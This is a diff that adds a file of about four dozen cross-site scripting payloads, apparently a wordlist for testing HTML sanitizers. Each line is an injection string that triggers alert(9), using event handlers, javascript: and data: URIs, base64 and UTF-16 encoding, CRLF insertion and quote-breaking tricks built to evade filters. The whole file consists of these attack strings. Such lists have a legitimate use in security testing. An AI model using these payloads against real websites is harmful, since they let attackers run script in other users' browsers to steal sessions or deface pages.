@@ -1,0 +1,47 @@
+<a'' href'' onclick=alert(9)>foo</a>
+<img/src=""onerror=alert(9)>
+<a"" href=""onclick=alert(9)>foo</a>
+<img%0d%0asrc=""%0d%0aonerror=alert(9)>
+<a href="java&#115;cript:alert(9)">foo</a>
+<a href="java&#x73;cript:alert(9)">foo</a>
+<a href="java&#x0073;cript:alert(9)">foo</a>
+<input type=text name=foo value=a%20onchange=alert(9)>
+<input type="text" name="foo" value=""onmouseover=alert(9)//">
+<input type='text' name='foo' value=''onclick=alert(9)//'>
+<input type="text" name="foo" value=""autofocus/onfocus=alert(9)//">
+<a href="data:text/html,<script>alert(9)</script>">foo</a>
+<script src="data:,alert(9)"></script>
+<script src="data:application/x-javascript,alert(9)"></script>
+<script src="data:text/javascript,alert(9)"></script>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCg5KTwvc2NyaXB0Pg">foo</a>
+<script src="data:;base64,YWxlcnQoOSk"></script>
+<a href="data:text/html;charset=utf-16,
+%ff%fe%3c%00s%00c%00r%00i%00p%00t%00%3e
+%00a%00l%00e%00r%00t%00(%009%00)%00
+<%00/%00s%00c%00r%00i%00p%00t%00>%00">foo</a>
+<svg onload="javascript:alert(9)" xmlns="http://www.w3.org/2000/svg"></svg>
+<svg xmlns="http://www.w3.org/2000/svg">
+<g onload="javascript:alert(9)"></g></svg>
+<svg><script xlink:href=data:,alert(9)></script>
+<svg xmlns="http://www.w3.org/2000/svg">
+<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(9)">
+<rect width="1000" height="1000" fill="white"/></a></svg>
+<script%0d%0aalert(9)</script>
+<script%20<!--%20-->alert(9)</script>
+<a href=""&<img&amp;/onclick=alert(9)>foo</a>
+<script/<a>alert(9)</script>
+<script/<a>alert(9)</script </a>
+<a""id=a href=''onclick=alert(9)>foo</a>
+<a href=""&amp;/onclick=alert(9)>foo</a>
+<script/id="a">alert(9)</script>
+<img src=">"onerror=alert(9)>
+<img id="><"class="><"src=">"onerror=alert(9)>
+<img src="\"a=">"onerror=alert(9)>
+<a id=' href="">'href=javascript:alert(9)>foo</a>
+<a id='href=http://web.site/'onclick=alert(9)>foo</a>
+<a href= . '"\' onclick=alert(9) '"'>foo</a>
+<img src="\"'<a href='">"'onerror=alert(9)>
+<a id='http://web.site/'onclick=alert(9)<!--href=a>foo</a>-->
+<img src="'"id='<img src="">'onerror=alert(9)>
+<img src="<img src='<img src=.>'>"onerror=alert(9)>
+<a href=javascript:alert(9) href href='' href="">foo</a>
